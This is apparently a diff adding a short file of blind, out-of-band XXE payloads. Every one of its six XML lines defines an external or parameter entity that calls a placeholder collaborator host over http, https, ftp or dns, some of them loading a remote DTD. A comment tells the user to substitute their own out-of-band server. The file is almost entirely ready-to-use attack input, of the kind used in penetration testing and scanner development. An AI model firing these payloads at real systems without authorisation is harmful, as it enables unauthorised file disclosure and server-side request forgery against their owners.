@@ -1,0 +1,9 @@
+# XXE Out-of-Band (Blind XXE) Payloads
+# Replace BURP_COLLABORATOR with your OOB server
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dns://BURP_COLLABORATOR">]><foo>&xxe;</foo>
+# Parameter Entity
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/evil.dtd">%xxe;%param1;]><foo></foo>
